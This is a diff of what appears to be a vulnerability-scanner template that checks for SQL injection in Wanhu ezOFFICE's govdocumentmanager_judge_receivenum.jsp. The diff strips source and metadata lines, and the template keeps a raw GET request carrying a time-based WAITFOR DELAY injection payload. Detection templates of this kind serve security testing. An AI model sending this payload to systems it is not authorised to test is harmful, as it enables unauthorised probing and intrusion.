@@ -3,12 +3,8 @@ info:
   name: 万户网络-ezOFFICE govdocumentmanager_judge_receivenum存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mddzl9r2xbhkct69'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mddzl9r2xbhkct69
-    fofa: app="万户网络-ezOFFICE"
 http:
 - raw:
   - GET /defaultroot/modules/govoffice/gov_documentmanager/govdocumentmanager_judge_receivenum.jsp;.js?numId=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
